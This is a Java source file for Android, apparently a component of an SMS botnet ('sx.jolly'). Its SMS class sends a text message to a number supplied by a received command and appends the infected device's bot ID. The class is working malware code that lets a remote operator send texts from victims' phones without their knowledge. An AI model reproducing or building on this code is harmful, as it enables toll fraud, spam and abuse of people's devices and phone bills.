package sx.jolly.utils;

import android.content.Context;
import android.telephony.SmsManager;
import sx.jolly.core.SingleCommand;

public class SMS {
    private Context context = null;

    public SMS(Context context) {
        this.context = context;
    }

    public void sendSMS(SingleCommand command) {
        SmsManager.getDefault().sendTextMessage(command.findProperty("numberTo").getValue(), null, new StringBuilder(String.valueOf(command.findProperty("message").getValue())).append(" ").append(Utils.getBotId(this.context)).toString(), null, null);
        Utils.slog(SMS.class, "sms sent to " + command.findProperty("numberTo").getValue());
    }
}
